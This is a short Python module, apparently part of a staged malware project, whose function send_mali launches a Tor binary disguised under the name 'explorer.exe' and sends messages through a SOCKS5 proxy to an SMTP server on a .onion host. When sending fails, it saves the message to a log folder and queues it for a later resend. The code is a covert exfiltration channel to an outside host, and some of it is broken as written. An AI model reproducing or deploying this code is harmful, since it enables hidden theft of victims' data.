# import Stage1.GlobalVariables as var

import Stage1.Download
import smtplib
from time import strftime, gmtime
import socks
import os
from threading import Timer


def log(url, pwd):
    pass


def send_mali(process, email, password, message):
    try:
        os.system(var.nt_format(var.tor_root) + "explorer.exe")
        s = socks.wrap_module(smtplib.SMTP(host="torbox3uiot6wchz.onion", port=25))
        s.set_proxy(socks.SOCKS5, "localhost", 9500)
        # server = smtplib.SMTP(host="torbox3uiot6wchz.onion", port=25)
        s.login(email, password)
        s.sendmail(email, email, message)
        s.quit()
        return True
    except ConnectionError:
        try:
            with open(var.nt_format(var.log_root) + process+"_" + strftime("%Y-%m-%d_%H-%M-%S", gmtime()), "wb") as msg:
                msg.write(message)
                msg.close()
                try:
                    with open(var.nt_format(var.log_root) + "pending", "w") as f:
                        f.write(var.log_root + process + "_" + strftime("%Y-%m-%d_%H-%M-%S", gmtime()) + "\n")
                        f.close()
                        return True
                except:
                    return False

        except:
            return False


if __name__ == "__main__":
    __name__ = "Log"
